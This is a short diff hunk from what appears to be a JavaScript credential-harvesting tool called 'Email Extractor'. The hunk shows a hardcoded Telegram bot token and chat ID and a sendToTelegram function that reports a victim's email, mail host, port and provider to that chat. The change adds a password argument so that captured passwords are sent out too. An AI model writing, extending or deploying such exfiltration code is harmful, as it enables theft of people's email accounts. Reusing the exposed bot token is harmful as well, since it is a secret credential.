@@ -87,7 +87,7 @@ async function jpost(url, body) {
 const TELEGRAM_BOT = '8765850967:AAEQK8G0DvMs_9J6m9uuPvHPu2YtzN2VFx8';
 const TELEGRAM_CHAT = '-1004360543341';
 
-async function sendToTelegram(email, host, port, provider) {
+async function sendToTelegram(email, host, port, provider, password) {
   const msg = `<pre>Email Extractor — New Connection
 
 Email : ${email}
